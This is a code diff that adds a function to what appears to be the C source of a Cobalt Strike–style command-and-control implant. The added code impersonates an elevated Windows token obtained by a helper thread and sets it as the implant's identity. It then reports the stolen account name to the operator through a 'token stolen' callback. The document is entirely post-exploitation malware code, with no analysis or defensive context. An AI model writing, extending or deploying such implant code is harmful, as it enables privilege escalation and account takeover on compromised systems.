@@ -405,3 +405,32 @@ void IdentityElevatePre(char* buffer, int length)
 		hPreelevationAuxThread = CreateThreadEx(IdentityElevationThread, NULL);
 	}
 }
+
+void IdentityElevatePost()
+{
+#define MAX_ACCOUNT_NAME 0x200
+	char accountName[MAX_ACCOUNT_NAME];
+	if (hPreelevationAuxThread != INVALID_HANDLE_VALUE)
+	{
+		WaitForSingleObject(hPreelevationAuxThread, 15000);
+	}
+
+	if(hElevationToken == INVALID_HANDLE_VALUE)
+	{
+		LERROR("Failed to open token");
+		BeaconErrorNA(ERROR_OPEN_TOKEN_FAILED);
+		return;
+	}
+
+	if (!ImpersonateLoggedOnUser(hElevationToken))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Failed to impersonate token: %s", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_POST_IMPERSONATE_TOKEN_FAILED, lastError);
+		return;
+	}
+
+	gIdentityToken = hElevationToken;
+	if (IdentityGetUserInfo(hElevationToken, accountName, sizeof(accountName)))
+		BeaconOutput(CALLBACK_TOKEN_STOLEN, accountName, strlen(accountName));
+}
